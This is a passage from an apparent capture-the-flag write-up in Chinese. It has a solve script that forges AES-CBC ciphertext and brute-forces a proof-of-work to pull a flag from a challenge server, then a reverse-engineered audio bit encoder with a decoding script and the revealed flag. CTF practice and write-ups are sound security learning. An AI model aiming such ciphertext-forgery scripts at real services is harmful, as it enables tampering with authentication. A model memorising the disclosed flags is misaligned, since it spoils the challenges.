        decd = b""
        cipher = AES.new(key, AES.MODE_CBC, iv)
        while index < len(data):
            decd += cipher.decrypt(data[index : index + BLOC])
            index += BLOC

        if pad != 0:
            decd = decd[: len(decd) - pad]
        return decd.decode("utf-8")
    

    
    def encrypt(self, plaintext: str) -> str:
        # 原始明文处理
        data = plaintext.encode("utf-8")
        orig_len = len(data)
        stupid_time_ok = str(int(time.time())//600*600) [-3:]
        print("L70",stupid_time_ok)
        assert orig_len == 35
        pad = self.BLOC - (orig_len % self.BLOC) if orig_len % self.BLOC != 0 else 0
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enct = b""
        index=0
        BLOC = self.BLOC

        blockA = data[:BLOC]

        encryptedBlockA = cipher.encrypt(blockA)

        blockB = data[BLOC:2*BLOC]

        encryptedBlockB = cipher.encrypt(blockB) # it is '???ppppppppppppp'
        print("L88",encryptedBlockB,AES.new(key, AES.MODE_CBC, encryptedBlockA).encrypt(blockB))

        """
        
         "input: 000lllllllllllll ???"
            # dec = "xxxppppppppppppp"
            # data = "000lllllllllllll ???ppppppppppppp"
            # data = "???ppppppppppppp 000lllllllllllll"
            # encrypt(xxxppppppppppppp)=000lllllllllllll
        """


        # print(encryptedBlockB[4:16],len(encryptedBlockB[4:16]))
        # good0 = crackGoodData(encryptedBlockB[3:16],encryptedBlockB,stupid_time_ok) # it is 'xxx'
        good0=b'o\xa6h'
        print("L95",good0)

        encryptedGoodAll = AES.new(b"UZhyYC6oiNH2IDZE", AES.MODE_ECB).encrypt(good0+encryptedBlockB[3:16]) # it is '000lllllllllllll'
        print(encryptedGoodAll)

        return encryptedBlockA + encryptedGoodAll + encryptedBlockB[0:3]



        
        # 构造填充数据
        # if pad != 0:
        #     # 生成填充字节（需与解密逻辑对应）
        #     temp_block = data[-(self.BLOC - pad):] + bytes([pad] * pad)
        #     cipher_ecb = AES.new(self.key, AES.MODE_ECB)
        #     fake_block = cipher_ecb.encrypt(temp_block)
            
        #     # 重组数据块结构
        #     data = data[:-pad] + fake_block + data[-pad:]

        # # CBC模式加密
        # cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        # encrypted = cipher.encrypt(data)
        
        # # 最终重组块结构（适配解密逻辑）
        # if pad != 0:
        #     # 将填充块插入到倒数第二个位置
        #     encrypted = (encrypted[:-2*self.BLOC] + 
        #                 encrypted[-self.BLOC:] + 
        #                 encrypted[-2*self.BLOC:-self.BLOC])
        
        # return encrypted.hex()
        # return enct+b'\r\r\r'

aes=AESCryptService()

# AES加密
# padded_plaintext = pad(plaintext.encode(), AES.block_size)
# cipher = AES.new(key, AES.MODE_CBC, iv)
# ciphertext = cipher.encrypt(padded_plaintext)
# data = ciphertext.hex()
ciphertext = aes.encrypt(plaintext)

data = ciphertext.hex()

# 暴力破解code
# timestamp = current_time
assert int(time.time())//600*600 == valid_timestamp,'too slow'
code = None
timestamp = int(time.time())
for i in range(1000000):
    candidate = str(i)
    hash_input = f"{data}{timestamp}{candidate}".encode()
    if md5(hash_input).hexdigest().startswith("00000"):
        code = candidate
        break

print(timestamp,timestamp//600*600)

if code:
# if 1:
    # 发送请求
    response = requests.post(
        # "http://localhost:5000/flag",
        "http://w7mfrhv9227cjhj2.instance.penguin.0ops.sjtu.cn:18080/flag",
        data={"data": data, "code": code, "timestamp": timestamp}
    )
    print(response.json())
else:
    print("Failed to generate valid code.")
```


# NoisyCat
> 电话里听到了奇怪的声音。

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *input_file; // rdi
  FILE *v5; // rbp
  size_t filesize; // r14
  void *input_file_buf; // rsi
  void *v8; // rax
  void *output_file_buf; // rbx

  if ( argc > 2 )
  {
    input_file = fopen(argv[1], "rb");
    if ( input_file )
    {
      v5 = fopen(argv[2], "wb");
      if ( v5 )
      {
        fseek(input_file, 0, 2);
        filesize = ftell(input_file);
        fseek(input_file, 0, 0);
        input_file_buf = j__malloc_base(filesize);
        v8 = j__malloc_base(800 * (int)filesize + 320);
        output_file_buf = v8;
        if ( input_file_buf && v8 )
        {
          fread(input_file_buf, filesize, 1ui64, input_file);
          fclose(input_file);
          sub_140001008(filesize, (__int64)input_file_buf, (__int64)output_file_buf);
          fwrite(output_file_buf, 800 * (int)filesize + 320, 1ui64, v5);
          fclose(v5);
          free(input_file_buf);
          free(output_file_buf);
          return 0;
        }
        printf("failed to allocate memory\n");
        free(input_file_buf);
        free(output_file_buf);
      }
      else
      {
        printf("can not open output file: %s\n", argv[2]);
        fclose(input_file);
      }
    }
    else
    {
      printf("can not open input file: %s\n", argv[1]);
    }
  }
  else
  {
    printf("usage: %s <input> <output>\n", *argv);
  }
  return -1;
}
```

```cpp
void __fastcall sub_140001008(int filesize, __int64 input_file_buf, __int64 output_file_buf)
{
  __int64 v4; // rbx
  __int64 v6; // rbp
  __int64 v7; // rbx
  unsigned int v8; // r14d
  int i; // esi

  v4 = filesize;
  add_bit(0, output_file_buf);
  add_bit(0, output_file_buf);
  v6 = v4;
  if ( (int)v4 > 0 )
  {
    v7 = 0i64;
    do
    {
      add_bit(1, output_file_buf);
      v8 = *(unsigned __int8 *)(v7 + input_file_buf);
      for ( i = 0; i < 8; ++i )
        add_bit((v8 >> i) & 1, output_file_buf);
      add_bit(0, output_file_buf);
      ++v7;
    }
    while ( v7 < v6 );
  }
  add_bit(0, output_file_buf);
  add_bit(0, output_file_buf);
}
```

省流就是：先输出两个0，然后每个byte逆转，在两边加上一个1一个0.

```cpp
void __fastcall sub_1400010B4(int input_data_bit, __int64 a2)
{
  int segment; // ebx
  float v4; // xmm7_4
  float v5; // xmm9_4
  float v6; // xmm0_4

  segment = 0;
  if ( input_data_bit )
    v4 = 40.0;
  else
    v4 = 21.818182;
  do
  {
    v5 = 6.283185307179586 / v4;
    v6 = sinf((float)(*(float *)&dword_140027CC8 * 6.283185307179586) + (float)((float)segment++ * v5));
    *(_WORD *)(a2 + 2i64 * dword_140027CCC++) = lroundf(v6 * 32767.0);
  }
  while ( segment < 40 );
  dword_140027CC8 = fmodf((float)(40.0 / v4) + *(float *)&dword_140027CC8, 1.0);
}
```

直接嗯逆好吧

```python
from scipy.io import wavfile
import numpy as np
import matplotlib.pyplot as plt

# 读取WAV文件
samplerate, data = wavfile.read("data.wav")

# 处理多声道数据
if data.ndim > 1:
    n_channels = data.shape[1]
    # 分离声道（例如立体声：left_channel = data[:, 0]）
    channels = [data[:, i] for i in range(n_channels)]
else:
    n_channels = 1
    channels = [data]

# 遍历所有采样点
for sample_index in range(len(data)):
    current_sample = data[sample_index]

# 打印元信息
print(f"采样率: {samplerate}Hz")
print(f"总采样点数: {len(data)}")
print(f"声道数: {n_channels}")


# 假定已知这是单声道文件


def one_or_zero(x):
    a =abs(x)
    aa=abs(a-0.025)
    ab=abs(a-0.04583333295138889)
    if(aa<ab):
        return 1
    else:
        return 0

def find_max_index(arr):
    max_index = np.argmax(arr)
    return max_index

r = []

# for i in range(len(data)//3, len(data)//3*2, 40):
for i in range(0, len(data), 40):
    segment = data[i:i+40]

    freq = np.arcsin([k/32767 for k in segment])
    G_plus_seg_v4 = [k/6.283185307179586 for k in freq]
    # Good_1= np.abs(G_plus_seg_v4)
    notbad = [abs(G_plus_seg_v4[j]-G_plus_seg_v4[j+1]) for j in range(len(G_plus_seg_v4)-1)]

    # print(np.mean(notbad))
    # r.append(np.mean(notbad))
    print(one_or_zero(np.mean(notbad)),end="")
```

总之出来的结果相当简洁明了

```
And cat said, "Let there be flag," and there was flag.
0ops{057d572f-92e2-4830-8095-f368a624e746}
Cat saw that the flag was good, and cat encoded the flag into the sound.
```
